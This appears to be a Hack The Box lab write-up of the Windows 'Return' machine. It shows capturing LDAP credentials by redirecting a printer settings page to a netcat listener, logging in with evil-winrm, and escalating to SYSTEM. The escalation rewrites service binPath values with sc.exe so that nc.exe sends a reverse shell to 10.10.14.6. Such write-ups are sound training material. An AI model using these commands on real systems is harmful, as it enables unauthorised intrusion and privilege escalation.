---
layout: post
title:  "Return Writeup - Hack The Box"
date:   2023-11-06
desc: "Abusing Printer, Abusing Server Operators Group, Service Configuration Manipulation"
keywords: "HTB,eJPT,OSCP,Easy"
categories: [HTB]
tags: [HTB,eJPT,OSCP,Windows,binPath,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I continue my way to the [EJPT](https://security.ine.com/certifications/ejpt-certification/){:target="_blank"} certification by completing the [Hack The Box](https://www.hackthebox.com/){:target="_blank"} **Return** box has a Windows OS, classified as easy. I deploy the machine and start the reconnaissance phase.

<br/><br/>
<img src="{{ site.img_path }}/return_writeup/Return.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I use **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** to deploy the box and check that I have connectivity to the box. Following the steps of a good pentester, I list the open ports on the machine to know which protocols and services can be exploited, using `nmap`.

```bash
./htbExplorer -d Return
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.108 -oG allPorts
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

There are a large number of open ports, many of them interesting. With the risk of getting lost among so much information I will start from the basics and move on, as I find interesting things. Using the `crackmapexec` tool, I get information on the **SMB** protocol, which is signed, which is a good practice, It also informs me the version and architecture of the Windows operating system (*Windows 10.0 Build 17763 x64*).

```bash
cat targeted

nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108 -oN targeted
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Of the many open ports, I filter those that have an **HTTP** protocol to analyze them, if I don't find anything, I continue with other protocols such as **SMB**, **LDAP**, etc. I use `watweb` to perform a recognition of the technologies used in the web service exposed on port **80**, nothing interesting. I access it from the browser and surfing a little, I only find the **Settings** page active.

```bash
cat targeted | grep http
whatweb http://10.10.11.108   # --> Microsoft-IIS/10.0
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I access the **Settings** page, and I see something that catches my attention as soon as I access, there is a form and a **Password** field, which could contain a password, but from the source code I see that it is only a text.

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I analyze the page, it seems that some kind of update is performed on the local server (the victim machine) using the **LDAP** protocol. I will try sending this request to my machine, since I can manipulate the **server** field. With `netcat` I capture the credentials of the user `svc-printer`. I use `crackmapexec` to validate that the user exists and the password is valid, and it is.

> printer.return.local <- Replace with -> 10.10.14.6

```bash
nv -nlvp 389

cme smb 10.10.11.108 -u svc-printer -p '*******'
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Since I have a user with valid credentials, I can check with another `winrm`, another `crackmapexec` tool, to see if the user belongs to the **Remote Management Users Group**. The tool confirms my suspicion, now I can use `evil-winrm` to connect to the victim machine. I enter some basic commands to check which user I am logged in, the hostname of the machine and I can also read the first flag of the user.

```bash
cme smb 10.10.11.108 -u svc-printer -p '*******'

gem install evil-winrm            # Install the tool!

evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '*********'
```

<br/><br/>
<img src="{{ site.img_path }}/return_writeup/Return_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I investigate the groups to which the user belongs, I find two interesting groups:**Print Operators**, **Server Operators**. If I research on the internet in the Microsoft documentation, I find their characteristics, but the most important thing is that users who are in the **Server Operators** group can stop and start services in Windows.

```powershel
 net user svc-printer
```

> **Print Operators**: Members of this group can manage, create, share, and  delete printers that are connected to domain controllers in the domain. They also can manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain.

> **Server Operators**: Members of the [Server Operators group](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups){:target="_blank"} can sign in to a server interactively, create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer, and shut down the computer. This group cannot be renamed, deleted, or moved.

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Since I now know that I can stop and start services, I can try to escalate privileges by manipulating the **`binPath`** and send me a **Reverse Shell** with `netcat.exe`. I look for the services started on the system and also upload the `nc.exe` executable from my machine to the server.

> **binPath Privilege Escalation**: Services created by SYSTEM having weak permissions can lead to privilege escalation. If a low privileged user can modify the service configuration, i.e. change the **[binPath](https://zflemingg1.gitbook.io/undergrad-tutorials/privilege-escalation/privilege-escalation){:target="_blank"}** to a malicious binary and restart the service then, the malicious binary will be executed with SYSTEM privileges.

```powershell
services
```

```bash
locate nc.exe
cp /opt/SecLists/Web-Shells/FuzzDB/nc.exe .
```

```powershell
upload /home/al3j0/Documents/HackTheBox/Return/content/nc.exe
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can try to create directly a service, that at startup looks for the binary to execute in the path where I downloaded the `netcat.exe`. But I do not have the necessary permissions to exploit this attack vector.

>  The SC Create command uses the following format: `sc create serviceName binpath= "path\to\service-wrapper-7.4.exe" optionName= optionValue ...` where: `create` is the command to be run by `SC` (this command name is mandatory to create a service).

```powershell
sc.exe create privescService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.6 443"
# Access is denied.       :(
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am trying with different services, some of them generate permission errors, others I can manipulate, but the **Reverse Shell** is not very stable. When I manipulate the **VGAuthService** service it sends me the shell but in a very short time it hangs.

```powershell
sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.6 443"
```

```bash
rlwrap nc -nlvp 443
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/return_writeup/Return_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try with different services, but with **VGAuthService** and **VMTools** I get the shell and I can access the contents of the `root` user flag.

```powershell
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.6 443"
```

```bash
rlwrap nc -nlvp 443
```

```powershell
sc.exe stop VMTools
sc.exe start VMTools
```

<br/>
<img src="{{ site.img_path }}/return_writeup/Return_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>


Machine rooted, I can now kill the box and continue with the next box of [Hack The Box](https://www.hackthebox.com/){:target="_blank"}.

```bash
htbExplorer -k Return
```
